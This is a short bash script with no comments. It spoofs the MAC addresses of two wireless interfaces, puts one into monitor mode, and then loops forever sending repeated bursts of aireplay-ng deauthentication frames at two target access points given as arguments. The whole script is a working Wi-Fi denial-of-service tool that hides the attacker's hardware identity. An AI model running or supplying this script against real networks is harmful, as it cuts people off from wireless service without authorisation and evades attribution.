
#!/bin/bash

ifconfig wlan1 up
ifconfig wlan1 down
macchanger -r wlan1
ifconfig wlan1 up 
iwconfig wlan1 channel $1
airmon-ng start wlan0
ifconfig wlan0mon down
macchanger -r wlan0mon
ifconfig wlan0mon up
iwconfig wlan0mon channel $2
while true ;do (mycount=0; while (( $mycount < $3 )); do aireplay-ng -0 30 -a $5 wlan1 && aireplay-ng -0 30 -a $6 wlan0mon;((mycount=$mycount+1)); done;); sleep $4; done;
